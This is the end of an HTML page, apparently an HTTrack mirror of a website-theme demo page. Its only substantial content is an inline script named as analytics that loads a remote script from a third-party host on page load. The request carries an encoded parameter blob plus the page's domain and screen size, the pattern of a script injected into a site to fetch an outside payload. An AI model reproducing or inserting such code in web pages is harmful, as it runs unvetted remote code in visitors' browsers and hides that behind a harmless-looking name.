    if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2WzXUQZRDshgTpd3FhBzhranHLvlHXjLOowYxGtT%2brcJv9BClemOg5OjPQjZXx9qHFApxagOT5YBOIm5zXYfwwI3A5Yt%2bcy3Fwx%2fbee%2bI3ayQ4HJ3nkKe9YEE3IXgKbQatgbEdO9%2brq0ZBCiKOKYC6lT3xWbFQm4xsDEFWSWWwJqSy%2fQ0O%2fiBs64BICwZpzBVMNd6ITLGI3IgtrcXOlZbKhbp4Zi6eEU3QItUrdLFUWKDblNiYU0CuUwC0jgaXfyXfHUWH6eZyysVLF7gvhjeKMrlhP1g2vtYyn5u82Crh5Og7xMEf8o5IaSe6nKcOcgNXDJ01I0xHJG%2b50ybd%2f4dtJRzode9CVIxpjHrT9A9kMye%2b%2fTD5rwpGKGqCyqTHdKc4YkpzfZ3PBfdgm2J5jtUfgyJssHB3fDbwPmi00bzy6cRkjkpKCPf7f9JTX3x0tnZzU3uU630%2fSLOmMc4IkG5iuraAHzby6skHxDVyifwiUo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>
<!-- Mirrored from www.inspirothemes.com/polo/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Sep 2019 06:24:43 GMT -->

</html>